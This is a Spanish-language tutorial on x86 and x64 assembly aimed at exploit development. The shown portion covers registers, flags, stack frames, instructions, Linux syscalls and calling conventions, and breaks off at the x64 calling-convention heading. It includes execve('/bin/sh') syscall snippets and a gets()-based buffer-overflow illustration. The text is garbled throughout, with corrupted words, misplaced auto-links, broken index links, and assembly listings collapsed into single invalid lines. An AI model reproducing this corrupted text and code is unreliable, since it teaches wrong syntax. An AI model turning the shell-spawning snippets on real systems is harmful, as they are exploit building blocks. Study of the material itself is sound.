# Assembly para Hackers
## Assembly básico ([x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86)/[x64](../raw/4ss3mbly-f0r-h4ck3rs.md#x64), ARM) para entender exploits

> **Autor:** Contribución comunitaria
> **Nivel:** Intermedio
> **Objetivo:** Entender [assembly](../raw/4ss3mbly-f0r-h4ck3rs.md) x86, x64 y ARM para escribir exploits, leer disassembly y entender cómo funcioniones)a un programa por debajo.
> **Requisitos:** Conocimientos básicos de C, entender qué es un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) y memoria.

---

## Índice

> ⏱️ **Tiempo estimado:** 20 horas (~4 sesiones) (2321 lineas)


1. [Introducción](#1-introducción) - 1.1 ¿Por qué [assemblymbly-f0r para hacking?](#11-por-qué-assembly-para-hacking) - 1.2 [Estructura de un programa en C vs assembly](#12-estructura-de-un-programa-en-c-vs-assembly)
2. [Arquitectura x86](#2-arquitectura-x86) - 2.1 [Registros de propósito general (EAX, EBX, ECX, EDX, ESI, EDI)](#21-registros-de-propósito-general-eax-ebx-ecx-edx-esi-edi) - 2.2 [Registros de segmento (CS, DS, ES, FS, GS, SS)](#22-registros-de-segmento-cs-ds-es-fs-gs-ss) - 2.3 [EFLAGS: el registro de flags](#23-eflags-el-registro-de-flags) - 2.4 E[ip: el instruction pointer](#24-eip-el-instruction-pointer) - 2.5 [La stack: ESP y EBP](#25-la-stack-esp-y-ebp) - 2.6 [Modos de direccionamiento de memoria](#26-modos-de-direccionamiento-de-memoria)
3. [Instruction Set x86](#3-instruction-set-x86) - 3.1 [MOV: mover datos](#31-mov-mover-datos) - 3.2 [PUSH y POP: la pila](#32-push-y-pop-la-pila) - 3.3 [adD, SUB, Inc, DEC: aritmética](#33-add-sub-inc-dec-aritmética) - 3.4 XOR, AND, OR, N[ot: lógica bitwise](#34-xor-and-or-not-lógica-bitwise) - 3.5 CMP y la [comparación](#35-cmp-y-la-comparación) - 3.6 [JMP y saltos condicionales (Jcc)](#36-jmp-y-saltos-condicionales-jcc) - 3.7 [CALL y RET: funciones](#37-call-y-ret-funciones) - 3.8 [INT: interrupciones](#38-int-interrupciones) - 3.9 [syscall: syscalls en Linux](#39-syscall-syscalls-en-linux)
4. [Calling Conventions en x86](#4-calling-conventions-en-x86) - 4.1 [cdecl: C declaration](#41-cdecl-c-declaration) - 4.2 [stdcall: standard call](#42-stdcall-standard-call) - 4.3 [fastcall: fast call](#43-fastcall-fast-call) - 4.4 [thiscall: C++ member functions](#44-thiscall-c-member-functions)
5. [x86-64: diferencias clave](#5-x86-64-diferencias-clave) - 5.1 [Registros: RAX-RBX, R8-R15](#51-registros-rax-rbx-r8-r15) - 5.2 [RIP-relative addressing](#52-rip-relative-addressing) - 5.3 Calling convention [x64 (RCX, RDX, R8, R9)](#53-calling-convention-x64-rcx-rdx-r8-r9) - 5.4 Camb[ios en SEH (Structured Exception Handling)](#54-cambios-en-seh-structured-exception-handling)
6. [Stack Frames](#6-stack-frames) - 6.1 [Function prologue](#61-function-prologue) - 6.2 [Function epilogue](#62-function-epilogue) - 6.3 [variables locales en la stack](#63-variables-locales-en-la-stack) - 6.4 [Layout de argumentos](#64-layout-de-argumentos) - 6.5 [Frame pointer y optimizaciones](#65-frame-pointer-y-optimizaciones)
7. [Disassembly Practice](#7-disassembly-practice) - 7.1 [Leyendo output de IDA Pro](#71-leyendo-output-de-ida-pro) - 7.2 [Leyendo output de Ghidra](#72-leyendo-output-de-ghidra) - 7.3 [reconociendo un loop](#73-reconociendo-un-loop) - 7.4 [Reconociendo un if/else](#74-reconociendo-un-ifelse) - 7.5 [Reconociendo un switch](#75-reconociendo-un-switch) - 7.6 [Reconociendo llamadas a funciones](#76-reconociendo-llamadas-a-funciones)
8. [Shellcode Basics](#8-shellcode-basics) - 8.1 [Qué es shellcode](#81-qué-es-shellcode) - 8.2 [Ejecutando /bin/sh en x86 Linux](#82-ejecutando-binsh-en-x86-linux) - 8.3 [Null-byte free shellcode](#83-null-byte-free-shellcode) - 8.4 [Alphanumeric shellcode](#84-alphanumeric-shellcode) - 8.5 [Shellcode en Windows](#85-shellcode-en-windows) - 8.6 [Probando shellcode con pwntools](#86-probando-shellcode-con-pwntools)
9. [exploit Primitives](#9-exploit-primitives) - 9.1 [buffer overflow: offset calculation](#91-buffer-overflow-offset-calculation) - 9.2 [EIP overwrite](#92-eip-overwrite) - 9.3 [SEH overwrite](#93-seh-overwrite) - 9.4 [ROP gadgets: ret2libc](#94-rop-gadgets-ret2libc) - 9.5 [ROP chains](#95-rop-chains)
10. [NOP Sleds](#10-nop-sleds) - 10.1 [Qué es un NOP sled](#101-qué-es-un-nop-sled) - 10.2 [Alignment y consideraciones de tamaño](#102-alignment-y-consideraciones-de-tamaño) - 10.3 [Identificando NOP sleds en memoria](#103-identificando-nop-sleds-en-memoria)
11. [ARM Basics](#11-arm-basics) - 11.1 [Registros ARM: R0-R15](#111-registros-arm-r0-r15) - 11.2 [Modos ARM vs Thumb](#112-modos-arm-vs-thumb) - 11.3 [Instruction set ARM: MOV, ADD, SUB, LDR, STR](#113-instruction-set-arm-mov-add-sub-ldr-str) - 11.4 [B, BL, BX: branching](#114-b-bl-bx-branching) - 11.5 [ARM calling convention](#115-arm-calling-convention)
12. [ARM Shellcode](#12-arm-shellcode) - 12.1 [Diferencias con x86](#121-diferencias-con-x86) - 12.2 [Thumb shellcode](#122-thumb-shellcode) - 12.3 [Null-byte constraints en ARM](#123-null-byte-constraints-en-arm) - 12.4 Ejemplo: exe[cve en ARM Thumb](#124-ejemplo-execve-en-arm-thumb)
13. [Herramientas](#13-herramientas) - 13.1 N[asm y YASM](#131-nasm-y-yasm) - 13.2 [GDB: layout asm, info registers, x/, stepi](#132-gdb-layout-asm-info-registers-x-stepi) - 13.3 [pwntools: asm, disasm, make_elf](#133-pwntools-asm-disasm-make_elf) - 13.4 [objdump y ndisasm](#134-objdump-y-ndisasm) - 13.5 [Online emuladores y sandboxes](#135-online-emuladores-y-sandboxes)
14. [Ejercicios Prácticos](#14-ejercicios-prácticos) - 14.1 [Ejercicio 1: Leer un disassembly simple](#141-ejercicio-1-leer-un-disassembly-simple) - 14.2 [Ejercicio 2: Encontrar el offset en un overflow](#142-ejercicio-2-encontrar-el-offset-en-un-overflow) - 14.3 [Ejercicio 3: Escribir shellcode ejecve](#143-ejercicio-3-escribir-shellcode-execve) - 14.4 [Ejercicio 4: Crear un ROP chain simple](#144-ejercicio-4-crear-un-rop-chain-simple) - 14.5 [Ejercicio 5: ARM Thumb shellcode](#145-ejercicio-5-arm-thumb-shellcode) - 14.6 [Ejercicio 6: Usar pwntools para armar un exploit](#146-ejercicio-6-usar-pwntools-para-armar-un-exploit) - 14.7 [Ejercicio 7: Leer un switch en IDA](#147-ejercicio-7-leer-un-switch-en-ida) - 14.8 Ejercicio 8: [reverse shell shellcode](#148-ejercicio-8-reverse-shell-shellcode)
15. [Referencias](#15-referencias)

---

## 1. Introducción

### 1.1 ¿Por qué assemblymbly-f0r para hacking?

El [assembly](../raw/4ss3mbly-f0r-h4ck3rs.md) (o [asm](../raw/4ss3mbly-f0r-h4ck3rs.md)) es el lenguaje más bajo al que podés acceder como humano sin escribir código de máquina directamente. Cuando hablamos de explotación de vulnerabilidades)es, entender [assembly](../raw/4ss3mbly-f0r-h4ck3rs.md) no es opcional: es **fundamental**.

pensa en esto: un [buffer overflow](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#buffer-overflow) te permite controlar el flujo de ejecución de un programa. ¿Cómo sabés qué dirección poner? Necesitás entender cómo funcioniones)a la pila, qué son los registros, cómo se llama una función, qué pasa con el return address. Todo eso está en assembly.

Con assembly podés:

- **Leer disassembly de binarios**: Cuando no tenés source code, el disassembly es tu única forma de entender qué hace un programa. IDA, [ghidra](../raw/4pk-r3v3rs1ng.md#ghidra), Binary Ninja te muestran assembly.
- **Escribir shellcode**: El shellcode no es más que assembly crudo metido en un buffer. Si no sabés assembly, no podés escribir shellcode custom.
- **Entender ROP**: Return-Oriented Programming consiste en encadenar "gadgets" que son secuencias de instrucciones assembly que terminan en RET. Sin assembly no hay ROP.
- **Reverse engineering**: Cualquier tarea de reversing termina en assembly.
- **[exploit](../raw/m3t4spl01t.md#exploits) development**: Desde un simple stack overflow hasta [exploit](../raw/m3t4spl01t.md#exploits) writing avanzado, todo requiere entender las instrucciones.

Básicamente: no podés explotar lo que no entendés. Y el assembly es cómo funciona realmente el procesador.

### 1.2 Estructura de un programa en C vs assembly

Mirá este programa en C:

```c
#include <stdio.h>

int suma(int a, int b) { return a + b;
}

int main { int resultado = suma(5, 3); printf("Resultado: %d\n", resultado); return 0;
}
```

Compilado y descompilado (sin optimización) en [x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86) se ve algo así:

```nasm
; int suma(int a, int b)
suma: push ebp ; guardar el frame pointer anterior mov ebp, esp ; establecer nuevo frame pointer mov eax, [ebp+8] ; cargar a (primer argumento) add eax, [ebp+12] ; sumar b (segundo argumento) pop ebp ; restaurar frame pointer ret ; volver (resultado en eax)

; int main
main: push ebp mov ebp, esp sub esp, 16 ; espacio para variables locales push 3 ; segundo argumento (b) push 5 ; primer argumento (a) call suma ; llamar a suma add esp, 8 ; limpiar argumentos de la pila mov [ebp-4], eax ; guardar resultado en variable local sub esp, 8 ; espacio para argumentos de printf push dword [ebp-4] ; el resultado push formato ; "Resultado: %d\n" call printf add esp, 16 ; limpiar todo mov eax, 0 ; return 0 leave ; mov esp, ebp / pop ebp ret
```

Cada línea de C se traduce a varias líneas de assembly. El [compilador](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#compiladores) maneja los registros, la pila, los saltos. Cuando hacés exploit, estás manipulando este comportamiento a bajo nivel.

---

## 2. Arquitectura x86

La arquitectura [x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86) (IA-32) es una arquitectura CISC (complex Instruction [set](../raw/ph1sh1ng.md#social-engineering-toolkit) Computer) de 32 bits. Intel la introdujo con el 80386 en 1985 y sigue siendo la base de los procesadores modernos (compatibilidad hacia atrás).

### 2.1 Registros de propósito general (EAX, EBX, ECX, EDX, ESI, EDI)

Los registros son ubicaciones de almacenamiento dentro del CPU, ultra rápidas (acceso en 1 ciclo de reloj). x86 tiene 8 registros de propósito general de 32 bits:

| Registro | Nombre | Propósito |
|----------|--------|-----------|
| EAX | Accumulator | Operaciones aritméticas, return value |
| EBX | Base | Dirección base (no siempre) |
| ECX | Counter | Contador para loops (rep, loop) |
| EDX | Data | I/O, multiplicación/división (parte alta) |
| ESI | Source Index | Origen en operaciones con strings |
| EDI | Destination Index | Destino en operaciones con strings |
| ESP | Stack Pointer | Tope de la pila |
| EBP | Base Pointer | Base del stack frame |

podés acceder a sub-registros:

```nasm
; EAX de 32 bits
mov eax, 0x12345678

; AX son los 16 bits bajos de EAX
; Después de mov eax, 0x12345678:
; AX = 0x5678

; AH son los 8 bits altos de AX (bits 8-15 de EAX)
; AL son los 8 bits bajos de AX (bits 0-7 de EAX)
; AH = 0x56
; AL = 0x78
```

Visualmente:

```
31 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 0
+----------------+----------------+----------------+----------------+----------------+----------------+
| EAX (32 bits) |
+----------------+----------------+----------------+----------------+----------------+----------------+
| | AX (16 bits) |
+----------------+----------------+----------------+----------------+----------------+----------------+
| | AH | AL |
+----------------+----------------+----------------+----------------+----------------+----------------+
```

Esto aplica a EAX, EBX, ECX, EDX. Para ESI, EDI, ESP, EBP solo tenés la versión de 16 bits (SI, DI, SP, BP), sin acceso a los bytes altos/bajos.

```nasm
; Ejemplos de sub-registros
mov al,  0xFF ; escribe solo el byte bajo de EAX
mov ax,  0xFFFF ; escribe los 16 bits bajos de EAX
mov eax, 0xFFFFFFFF ; escribe los 32 bits

; CUIDADO: cuando escribís a AL o AX, no limpiás los bits altos de EAX
; mov al, 0x1  deja el resto de EAX como estaba
; Pero en x86-64, escribir a EAX limpia los 32 bits altos de RAX
```

### 2.2 Registros de segmento (CS, DS, ES, FS, GS, SS)

Los registros de segmento se usaban en los viejos tiempos (real mode) para direccionar memoria. Hoy en día, con memoria plana (flat memory model), siguen existiendo pero tienen usos más específicos:

| Registro | Nombre | Uso moderno |
|----------|--------|-------------|
| CS | Code Segment | Segmento de código (no se modifica) |
| DS | Data Segment | Segmento de datos |
| ES | Extra Segment | Operaciones con strings (movs, stos, lods) |
| FS | FS Segment | [teb](../raw/w1n-1nt3rn4ls.md#teb) (Thread Environment Block) en Windows |
| GS | GS Segment | [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) (Thread Local Storage) en Linux x86-64 |
| SS | Stack Segment | Segmento de pila |

En Windows, el registro FS apunta al TEB del thread actual. Esto es clave en exploits: podés acceder a estructuras del [sistema operativo](../raw/0s-f0nd4m3nt0s.md#sistemas-operativos) a través de FS.

```nasm
; En Windows, acceder al PEB (Process Environment Block)
mov eax, fs:[0x30]  ; PEB en el TEB

; En Linux x86-64, acceder a TLS
mov rax, gs:[0x0]
```

### 2.3 EFLAGS: el registro de flags

EFLAGS es un registro de 32 bits donde cada bit indica el estado del procesador o el resultado de la última operación. Algunos flags clave:

| Bit | Flag | Nombre | Descripción |
|-----|------|--------|-------------|
| 0 | CF | Carry Flag | Indica acarreo en operaciones sin signo |
| 2 | PF | Parity Flag | Paridad del byte bajo (1 si par) |
| 4 | AF | [auxiliary](../raw/m3t4spl01t.md#auxiliary) Carry | Acarreo BCD (bit 3) |
| 6 | ZF | Zero Flag | Resultado es cero |
| 7 | SF | Sign Flag | Resultado negativo (bit más significativo) |
| 8 | TF | Trap Flag | Modo single-step (debug) |
| 9 | IF | Interrupt Flag | Interrupciones habilitadas |
| 10 | DF | Direction Flag | Dirección de string operations |
| 11 | OF | Overflow Flag | Desbordamiento en operaciones con signo |

```nasm
; Cómo se afectan los flags
mov eax, 5
sub eax, 5 ; ZF = 1 (resultado es 0), SF = 0

mov eax, 5
sub eax, 10 ; ZF = 0, SF = 1 (resultado negativo) ; CF = 1 (hubo borrow en unsigned)

mov eax, 0x7FFFFFFF
add eax, 1 ; OF = 1 (overflow signed: máximo positivo + 1)
```

Los flags los usa el procesador para decidir saltos condicionales (Jcc). Por ejemplo:

```nasm
cmp eax, ebx ; hace eax - ebx, afecta flags (ZF, SF, CF, OF)
je  etiqueta ; salta si igual (ZF=1)
jl  etiqueta ; salta si menor (signo, SF != OF)
jg  etiqueta ; salta si mayor (signo, SF=OF y ZF=0)
ja  etiqueta ; salta si above (unsigned, CF=0 y ZF=0)
jb  etiqueta ; salta si below (unsigned, CF=1)
```

### 2.4 EIP: el instruction pointer

EIP (Extended Instruction Pointer) es el registro que contiene la dirección de la **próxima instrucción a ejecutar**. Es el registro más importante para los exploits: si lográs controlar EIP, controlás el programa.

```nasm
; EIP siempre apunta a la siguiente instrucción
mov eax, 1 ; EIP apunta a mov eax, 1 ; cuando se ejecuta, EIP avanza a la siguiente línea
mov ebx, 2 ; ahora EIP apunta acá
```

Cuando hacés CALL, el procesador:
1. Guarda EIP (dirección de retorno) en la pila
2. Cambia EIP a la dirección de la función

Cuando hacés RET:
1. Saca la dirección de la pila
2. La pone en EIP

Por eso un [buffer overflow](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#buffer-overflow) que sobreescribe la dirección de retorno en la pila te permite controlar EIP:

```c
void vulnerable { char buffer[64]; gets(buffer);  // Si escribís más de 64 bytes, sobreescribís // el return address en la pila
}
```

```
Antes de gets:
[ buffer (64 bytes) ] [ EBP (4 bytes) ] [ Return Address (4 bytes) ]

Después de gets con más de 64 bytes:
[ AAAA..AAAA (64) ] [ BBBB (EBP) ] [ CCCC (EIP=0x43434343) ]
```

### 2.5 La stack: ESP y EBP

La stack (pila) es una región de memoria que crece hacia **abajo** (direcciones bajas). Se usa para:

- Almacenar direcciones de retorno
- Pasar argumentos a funciones
- variables locales
- Preservar registros

**ESP (Stack Pointer)**: apunta al tope de la pila (último elemento agregado).

**EBP (Base Pointer)**: apunta a la base del stack frame actual.

Operaciones básicas:

```nasm
; PUSH: decrementa ESP y escribe el valor
push eax
; es equivalente a:
sub esp, 4
mov [esp], eax

; POP: lee el valor de [ESP] e incrementa ESP
pop eax
; es equivalente a:
mov eax, [esp]
add esp, 4
```

La stack crece hacia abajo, así que cuando "subís" algo, ESP decrece:

```
Direcciones altas
+------------------+  <- EBP (base del frame)
| return address |
+------------------+
| argumentos |
+------------------+
| saved EBP |
+------------------+  <- EBP actual
| variables loc  |
+------------------+  <- ESP (tope de la pila)
Direcciones bajas
```

### 2.6 Modos de direccionamiento de memoria

x86 soporta varios modos de direccionamiento. Entenderlos es clave cuando leés disassembly:

```nasm
; 1. Registro directo
mov eax, ebx ; mueve el valor de EBX a EAX

; 2. Inmediato
mov eax, 0x42 ; carga el valor 0x42 en EAX

; 3. Directo (dirección de memoria)
mov eax, [0x12345678]  ; lee 4 bytes de la dirección 0x12345678

; 4. Indirección por registro
mov eax, [ebx] ; lee de la dirección contenida en EBX

; 5. Base + desplazamiento
mov eax, [ebx + 0x10]  ; lee de ebx + 0x10

; 6. Base + índice
mov eax, [ebx + esi] ; lee de ebx + esi

; 7. Base + índice * escala + desplazamiento (el más completo)
mov eax, [ebx + esi*4 + 0x10]
; escala puede ser 1, 2, 4 u 8

; 8. RIP-relative (x86-64 solamente)
lea rax, [rip + 0x1234]; carga dirección relativa a RIP
```

El modo 7 es muy común en arrays:

```c
int arr[10];
arr[i] = 5;
```

```nasm
; Suponiendo arr en EBP-40, i en ECX
mov dword [ebp - 40 + ecx*4], 5
```

---

## 3. Instruction Set x86

### 3.1 MOV: mover datos

MOV es la instrucción más básica. Copia datos de un origen a un destino. No se puede mover de memoria a memoria directamente.

```nasm
; Formatos válidos
mov reg, reg ; mov eax, ebx
mov reg, imm ; mov eax, 0x42
mov reg, mem ; mov eax, [0x12345678]
mov mem, reg ; mov [0x12345678], eax
mov mem, imm ; mov dword [0x12345678], 0x42

; NO VÁLIDO:
; mov mem, mem ; no existe
; mov seg, imm ; no se puede cargar un segmento con inmediato

; MOVZX: mover con extensión de ceros (unsigned)
movzx eax, byte [ebx]  ; carga un byte, extiende con ceros a 32 bits

; MOVSX: mover con extensión de signo (signed)
movsx eax, byte [ebx]  ; carga un byte, extiende el signo a 32 bits

; MOVSD: mover doubleword (string operation)
movsd ; mueve 4 bytes de [ESI] a [EDI], incrementa ESI y EDI
```

### 3.2 PUSH y POP: la pila

```nasm
; PUSH: pone un valor en la pila
push eax ; push registro de 32 bits
push 0x42 ; push inmediato
push dword [ebx] ; push desde memoria

; POP: saca un valor de la pila
pop eax ; pop a registro
pop dword [ebx] ; pop a memoria

; PUSHA/PUSHAD: push todos los registros de propósito general
pushad ; push EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI
popad ; pop inverso

; PUSHF/PUSHFD: push de EFLAGS
pushfd ; push EFLAGS
popfd ; pop a EFLAGS
```

### 3.3 adD, SUB, Inc, DEC: aritmética

```nasm
; ADD: suma
add eax, ebx ; eax = eax + ebx
add eax, 0x10 ; eax = eax + 16
add dword [ebx], 5 ; memoria += 5

; SUB: resta
sub eax, ebx ; eax = eax - ebx
sub esp, 16 ; reservar 16 bytes en la pila

; INC: incrementar en 1
inc eax ; eax++
inc dword [ebx] ; memoria++

; DEC: decrementar en 1
dec ecx ; ecx--

; MUL: multiplicación sin signo
; mul reg/mem -> EDX:EAX = EAX * fuente
mov eax, 5
mul ebx ; EDX:EAX = 5 * EBX (resultado de 64 bits)

; IMUL: multiplicación con signo
imul eax, ebx ; eax = eax * ebx

; DIV: división sin signo
; div reg/mem -> EDX:EAX / fuente
; EAX = cociente, EDX = resto
mov eax, 100
mov ecx, 7
div ecx ; EAX = 14, EDX = 2

; IDIV: división con signo
idiv ecx

; NEG: negar (complemento a dos)
neg eax ; eax = -eax
```

### 3.4 XOR, AND, OR, Not: lógica bitwise

Estas instrucciones son **fundamentales** en shellcode y exploits.

```nasm
; AND: AND bit a bit
and eax, ebx ; eax = eax & ebx
and eax, 0xFF ; máscara: solo queda el byte bajo

; OR: OR bit a bit
or eax, ebx ; eax = eax | ebx

; XOR: XOR bit a bit
xor eax, ebx ; eax = eax ^ ebx
xor eax, eax ; eax = 0 (MUY usado, más eficiente que mov eax, 0)

; NOT: complemento a uno
not eax ; eax = ~eax

; SHL/SHR: shift left/right
shl eax, 1 ; eax = eax << 1 (multiplicar por 2)
shr eax, 1 ; eax = eax >> 1 (dividir por 2, unsigned)

; SAR: shift aritmético right (preserva signo)
sar eax, 1 ; divide por 2 con signo

; ROL/ROR: rotate left/right
rol eax, 4 ; rota eax 4 bits a la izquierda

; Usos comunes de XOR en shellcode:
xor eax, eax ; zero un registro (2 bytes: 31 C0)
xor edx, edx ; zero otro (2 bytes: 31 D2)
xor ecx, ecx ; zero otro (2 bytes: 31 C9)

; XOR para cifrado simple (one-time pad estilo)
xor byte [ebx], 0xAA  ; XOR cada byte con 0xAA
```

### 3.5 CMP y la comparación

CMP compara dos operandos haciendo una **resta** y afectando los flags sin guardar el resultado:

```nasm
cmp eax, ebx ; calcula eax - ebx, afecta ZF, SF, CF, OF

; Después de CMP:
; ZF = 1 si eax == ebx
; SF = 1 si (eax - ebx) < 0 (con signo)
; CF = 1 si eax < ebx (sin signo, hubo borrow)

; TEST: AND bitwise que afecta flags (no guarda resultado)
test eax, eax ; calcula eax & eax ; ZF = 1 si eax == 0 ; SF = 1 si bit más alto de eax es 1 test eax, 0x80000000  ; ZF = 0 si el bit 31 está seteado
```

### 3.6 JMP y saltos condicionales (Jcc)

JMP es un salto incondicional. Los Jcc saltan según los flags.

```nasm
; Salto incondicional
jmp destino ; siempre salta

; Saltos por igualdad / cero
je  destino ; salta si igual (ZF=1)  -> jz también
jne destino ; salta si no igual (ZF=0) -> jnz

; Saltos signed (para int, signed char, etc)
jg  destino ; salta si mayor (ZF=0 y SF=OF)
jge destino ; salta si mayor o igual (SF=OF)
jl  destino ; salta si menor (SF != OF)
jle destino ; salta si menor o igual (ZF=1 o SF != OF)

; Saltos unsigned (para unsigned int, size_t, punteros)
ja  destino ; salta si above (CF=0 y ZF=0)  -> jnbe
jae destino ; salta si above or equal (CF=0) -> jnb, jnc
jb  destino ; salta si below (CF=1) -> jc, jnae
jbe destino ; salta si below or equal (CF=1 o ZF=1) -> jna

; Saltos por estado de flags
js  destino ; salta si sign (SF=1)
jns destino ; salta si no sign (SF=0)
jo  destino ; salta si overflow (OF=1)
jno destino ; salta si no overflow (OF=0)
jp  destino ; salta si parity (PF=1) -> jpe
jnp destino ; salta si no parity (PF=0) -> jpo

; Saltos por contador (loop)
loop destino ; decrementa ECX, salta si ECX != 0
```

### 3.7 CALL y RET: funciones

CALL y RET son las instrucciones para manejar llamadas a funciones/subrutinas.

```nasm
; CALL: llamar a una función
; 1. Pushea la dirección de retorno (EIP siguiente)
; 2. Salta a la dirección destino
call 0x12345678 ; call a dirección absoluta
call  [ebx] ; call a dirección en registro
call  funcion ; call a etiqueta (relativa)

; RET: retornar de una función
; 1. Saca la dirección de retorno de la pila
; 2. Salta a esa dirección
ret ; pop eip
ret 16 ; pop eip; add esp, 16 (stdcall cleanup)
```

### 3.8 INT: interrupciones

INT genera una interrupción software. En Linux, es el mecanismo clásico para hacer syscalls:

```nasm
; Syscall en Linux x86 mediante interrupción 0x80
; EAX = número de syscall
; EBX, ECX, EDX, ESI, EDI = argumentos

; sys_exit(0)
mov eax, 1 ; syscall number: sys_exit
xor ebx, ebx ; status = 0
int 0x80 ; llamar al kernel

; sys_write(stdout, msg, len)
mov eax, 4 ; syscall number: sys_write
mov ebx, 1 ; fd = stdout
mov ecx, msg ; buf
mov edx, 12 ; count
int 0x80

; sys_read(stdin, buf, len)
mov eax, 3 ; sys_read
mov ebx, 0 ; fd = stdin
mov ecx, buf ; buffer
mov edx, 64 ; count
int 0x80

; sys_execve(path, argv, envp)
mov eax, 11 ; sys_execve
mov ebx, path ; "/bin/sh"
mov ecx, argv ; array de argumentos
mov edx, envp ; environment
int 0x80
```

### 3.9 [syscall](../raw/0s-f0nd4m3nt0s.md#syscalls): syscalls en Linux

En [x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86)-64, se usa la instrucción SYSCALL (más rápida que int 0x80):

```nasm
; Syscall en x86-64
; RAX = número de syscall
; RDI, RSI, RDX, R10, R8, R9 = argumentos
; syscall instrucción

; sys_write(1, msg, len)
mov rax, 1 ; syscall: write
mov rdi, 1 ; fd = stdout
lea rsi, [rel msg] ; buf
mov rdx, 12 ; count
syscall

; sys_exit(0)
mov rax, 60 ; syscall: exit
xor rdi, rdi ; status = 0
syscall

; sys_execve("/bin/sh", 0, 0)
mov rax, 59 ; syscall: execve
lea rdi, [rel binsh]  ; path = "/bin/sh"
xor rsi, rsi ; argv = NULL
xor rdx, rdx ; envp = NULL
syscall
```

Los números de syscall varían entre arquitecturas. Tabla rápida:

| Syscall | x86 (int 0x80) | x86-64 |
|---------|----------------|--------|
| sys_exit | 1 | 60 |
| sys_fork | 2 | 57 |
| sys_read | 3 | 0 |
| sys_write | 4 | 1 |
| sys_open | 5 | 2 |
| sys_close | 6 | 3 |
| sys_execve | 11 | 59 |
| sys_mmap | 90 | 9 |
| sys_mprotect | 125 | 10 |

---

## 4. Calling Conventions en x86

Las calling conventions definen: cómo se pasan los argumentos, quién limpia la pila, dónde va el return value.

### 4.1 cdecl: C declaration

Usada por defecto en GCC para Linux [x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86).

**Características:**
- Argumentos se pasan por la pila (de derecha a izquierda)
- Caller limpia la pila
- Return value en EAX
- EAX, ECX, EDX son caller-saved (el llamado puede modificarlos)
- EBX, ESI, EDI, EBP, ESP son callee-saved

```c
int funcion(int a, int b, int c);
```

```nasm
; Caller:
push c ; ultimo argumento
push b ; segundo
push a ; primero (se apila ultimo)
call funcion
add esp, 12 ; caller limpia la pila

; funcion (callee):
funcion: push ebp mov  ebp, esp ; [ebp+8]  = a ; [ebp+12] = b ; [ebp+16] = c mov eax, [ebp+8] ; return a pop ebp ret
```

### 4.2 stdcall: standard call

Usada por la Win32 API (kernel3232), user32, etc).

**Características:**
- Argumentos por pila (derecha a izquierda)
- **Callee** limpia la pila
- Return value en EAX

```nasm
; Caller:
push c
push b
push a
call funcion
; NO add esp, 12 — el callee lo hace

; Callee:
funcion: push ebp mov  ebp, esp ; .. codigo .. pop ebp ret 12 ; ret n: pop eip + add esp, n
```

La diferencia clave: en stdcall, el RET lleva un argumento numérico que suma a ESP después de sacar la dirección de retorno.

```nasm
ret 12 ; equivalente a: ; pop eip ; add esp, 12
```

### 4.3 fastcall: fast call

Pasa los primeros 2-3 argumentos en registros.

**Características (MSVC/GCC):**
- Primer argumento en ECX
- Segundo argumento en EDX
- Resto en la pila (derecha a izquierda)
- Callee limpia la pila

```nasm
; fastcall(int a, int b, int c);
mov ecx, a ; primer argumento en ECX
mov edx, b ; segundo argumento en EDX
push c ; tercero en pila
call funcion
```

### 4.4 thiscall: C++ member functions

Usada para métodos de clase en C++.

**MSVC:**
- `this` en ECX
- Argumentos en pila (derecha a izquierda)
- Callee limpia la pila

**GCC:**
- `this` es el primer argumento (tratado como parámetro implícito)
- Usa cdecl, o fastcall si está habilitado

```c++
class Foo { int metodo(int a, int b);
};
```

```nasm
; MSVC:
mov ecx, this_ptr ; this en ECX
push b
push a
call Foo::metodo

; GCC (con cdecl):
push b
push a
push this_ptr ; this como primer argumento
call Foo::metodo
add esp, 12
```

---

## 5. x86-64: diferencias clave

### 5.1 Registros: RAX-RBX, R8-R15

[x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86)-64 expande los registros a 64 bits y agrega 8 nuevos:

| Registro 64 | 32-bit | 16-bit | 8-bit | Descripción |
|-------------|--------|--------|-------|-------------|
| RAX | EAX | AX | AL | Accumulator |
| RBX | EBX | BX | BL | Base |
| RCX | ECX | CX | CL | Counter |
| RDX | EDX | DX | DL | Data |
| RSI | ESI | SI | SIL | Source index |
| RDI | EDI | DI | DIL | Dest index |
| RBP | EBP | BP | BPL | Base pointer |
| RSP | ESP | SP | SPL | Stack pointer |
| R8 | R8D | R8W | R8B | Nuevo |
| R9 | R9D | R9W | R9B | Nuevo |
| R10 | R10D | R10W | R10B | Nuevo |
| R11 | R11D | R11W | R11B | Nuevo |
| R12 | R12D | R12W | R12B | Nuevo |
| R13 | R13D | R13W | R13B | Nuevo |
| R14 | R14D | R14W | R14B | Nuevo |
| R15 | R15D | R15W | R15B | Nuevo |

**Regla importante:** en x86-64, cuando escribís a un registro de 32 bits, se hace **zero-extend** a los 64 bits altos automáticamente:

```nasm
mov eax, 0x12345678 ; RAX = 0x0000000012345678 (auto zero-extend)
mov rax, 0x12345678 ; también funciona, pero codificación más larga

; Pero si escribís a 16 u 8 bits, NO se hace zero-extend:
mov ax, 0xFFFF ; RAX = 0x????????0000FFFF (bits altos se preservan)
```

### 5.2 RIP-relative addressing

En x86-64, hay un nuevo modo de direccionamiento: relativo a RIP (el instruction pointer). Esto permite código position-independent.

```nasm
; En x86: direccionamiento absoluto
mov eax, [0x12345678]

; En x86-64 (no se puede direccionamiento absoluto directo):
; Hay que usar RIP-relative o carga indirecta
lea rax, [rip + offset]  ; carga dirección relativa a RIP
mov eax, [rip + 0x1000]  ; accede a memoria relativa a RIP

; El compilador/disassembler muestra:
mov eax, [rip + 0x1234]  ; en realidad usa el offset desde la instrucción
; IDA/Ghidra muestran:
mov eax, etiqueta ; pero en los bytes es [rip + offset]
```

Esto es clave para shellcode x86-64: **todo** direccionamiento de datos debe ser RIP-relative.

### 5.3 Calling convention [x64](../raw/4ss3mbly-f0r-h4ck3rs.md#x64) (RCX, RDX, R8, R9)

